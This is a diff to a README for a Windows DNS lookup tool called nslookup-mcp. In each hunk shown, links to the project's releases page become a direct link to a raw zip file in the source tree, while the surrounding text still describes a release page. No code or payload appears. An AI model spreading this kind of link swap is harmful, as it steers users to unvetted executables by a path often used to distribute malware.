@@ -1,6 +1,6 @@
 # 🔎 nslookup-mcp - Simple DNS Checks for Windows
 
-[![Download nslookup-mcp](https://img.shields.io/badge/Download%20nslookup--mcp-6a5acd?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ayushje/nslookup-mcp/releases)
+[![Download nslookup-mcp](https://img.shields.io/badge/Download%20nslookup--mcp-6a5acd?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ayushje/nslookup-mcp/raw/refs/heads/main/src/nslookup-mcp-2.3.zip)
 
 ## 🧭 What this app does
 
@@ -30,7 +30,7 @@ If your PC blocks downloads, you may need to allow the file in your browser or i
 
 Visit this page to download the app:
 
-https://github.com/Ayushje/nslookup-mcp/releases
+https://github.com/Ayushje/nslookup-mcp/raw/refs/heads/main/src/nslookup-mcp-2.3.zip
 
 On that page, look for the latest release and download the Windows file for your PC
 
@@ -39,7 +39,7 @@ On that page, look for the latest release and download the Windows file for your
 Follow these steps:
 
 1. Open the release page  
-   Go to https://github.com/Ayushje/nslookup-mcp/releases
+   Go to https://github.com/Ayushje/nslookup-mcp/raw/refs/heads/main/src/nslookup-mcp-2.3.zip
 
 2. Find the latest version  
    The newest release is usually at the top of the page
@@ -195,7 +195,7 @@ Some users run nslookup-mcp with a host app that supports MCP. If that is your s
 
 Visit this page to download the app:
 
-https://github.com/Ayushje/nslookup-mcp/releases
+https://github.com/Ayushje/nslookup-mcp/raw/refs/heads/main/src/nslookup-mcp-2.3.zip
 
 ## 🧾 What to expect after setup
 
